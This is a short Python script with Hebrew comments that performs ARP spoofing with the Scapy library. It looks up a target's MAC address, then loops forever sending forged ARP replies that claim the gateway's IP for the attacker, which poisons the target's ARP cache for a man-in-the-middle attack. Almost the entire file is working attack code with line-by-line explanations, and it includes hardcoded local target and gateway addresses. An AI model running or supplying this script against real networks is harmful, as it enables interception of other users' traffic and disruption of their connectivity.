# arp_spoofing
# מייבא את כל הפונקציות והמחלקות מספריית Scapy
# Scapy משמשת ליצירה, שליחה וקליטה של חבילות רשת
import scapy.all as scapy


# פונקציה ששולחת חבילת ARP מזויפת
# target_ip  - כתובת ה-IP של היעד שאליו שולחים את החבילה
# target_mac - כתובת ה-MAC של היעד
# spoof_ip   - כתובת ה-IP שאליה מתחזים
def spoof(target_ip, target_mac, spoof_ip):

   # יצירת חבילת ARP Reply (is-at)
   # pdst  - כתובת ה-IP של היעד
   # hwdst - כתובת ה-MAC של היעד
   # psrc  - כתובת ה-IP המוצגת כשולח (התחזות)
   # op="is-at" מציין שזו תשובת ARP
   spoofed_arp_pocket = scapy.ARP(
       pdst=target_ip,
       hwdst=target_mac,
       psrc=spoof_ip,
       op="is-at"
   )

   # שליחת חבילת ה-ARP לרשת
   # verbose=0 מונע הדפסת פלט מיותר למסך
   scapy.send(spoofed_arp_pocket, verbose=0)


# פונקציה שמטרתה לגלות כתובת MAC של מחשב לפי כתובת IP
def get_mac(target_ip):

   # יצירת בקשת ARP בשכבת Ethernet
   # ff:ff:ff:ff:ff:ff היא כתובת Broadcast (שליחה לכל הרשת)
   arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=target_ip)

   # שליחת הבקשה והמתנה לתשובות
   # timeout=3 קובע זמן המתנה של 3 שניות
   reply, _ = scapy.srp(arp_request, timeout=3, verbose=0)

   # אם התקבלה תשובה
   if reply:
        # מחזיר את כתובת ה-MAC של המכשיר שענה
        return reply[0][1].src

   # אם לא התקבלה תשובה – מחזיר None
   return None


# כתובת ה-IP של שער הרשת (ראוטר)
gateway_ip = "10.100.102.1"

# כתובת ה-IP של היעד ברשת
target_ip = "10.100.102.104"

# אתחול משתנה לכתובת ה-MAC של היעד
target_mac = None


# לולאה שמנסה להשיג את כתובת ה-MAC של היעד
# הלולאה תמשיך לרוץ כל עוד לא התקבלה כתובת MAC
while target_mac is None:

    # ניסיון לקבל את כתובת ה-MAC של היעד
    target_mac = get_mac(target_ip)

    # אם לא הצליח
    if target_mac is None:
        print("Failed to get target MAC address. Retrying...")


# הדפסת כתובת ה-MAC שנמצאה
print("target mac address is:{}".format(target_mac))


# לולאה אינסופית
while True:

    # שליחת חבילת ARP מזויפת ליעד
    spoof(target_ip, target_mac, gateway_ip)

    # הודעה שמציינת שהפעולה מתבצעת
    print("activated spoofing")
